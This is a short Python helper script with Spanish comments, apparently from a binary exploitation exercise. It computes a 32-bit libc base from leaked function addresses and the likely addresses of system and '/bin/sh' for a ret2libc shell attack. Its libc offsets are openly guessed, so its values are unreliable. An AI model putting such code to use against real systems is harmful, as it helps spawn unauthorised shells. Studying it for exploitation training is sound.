#!/usr/bin/env python3

# Direcciones leakeadas
puts_leak = 0xf7ddb360
gets_leak = 0xf7ddaae0
strcmp_leak = 0xf7ec8450

# Calcular base de libc (asumiendo puts)
# Necesitamos encontrar el offset de puts en libc
# Vamos a intentar con versiones comunes

# Offsets comunes de puts en diferentes libcs de 32 bits
common_offsets = {
    'libc6-i386_2.27': 0x67360,
    'libc6-i386_2.23': 0x5f140,
    'libc6-i386_2.24': 0x5f140,
    'libc6-i386_2.28': 0x67360,
    'libc6-i386_2.29': 0x67360,
    'libc6-i386_2.30': 0x67360,
    'libc6-i386_2.31': 0x6f360,
}

print("[*] Leaked addresses:")
print(f"puts:   {hex(puts_leak)}")
print(f"gets:   {hex(gets_leak)}")
print(f"strcmp: {hex(strcmp_leak)}")

print("\n[*] Calculating possible libc bases:")
for name, offset in common_offsets.items():
    base = puts_leak - offset
    print(f"{name}: {hex(base)}")
    
# El offset más común es 0x67360 o 0x6f360
# Vamos a asumir 0x6f360 ya que termina en 360 como nuestro leak
libc_base = puts_leak - 0x6f360
print(f"\n[*] Most likely libc base: {hex(libc_base)}")

# Offsets típicos de system y /bin/sh
system_offset = 0x3cd80  # común en varias versiones
binsh_offset = 0x17b8cf   # común en varias versiones

print(f"[*] Potential system address: {hex(libc_base + system_offset)}")
print(f"[*] Potential /bin/sh address: {hex(libc_base + binsh_offset)}")
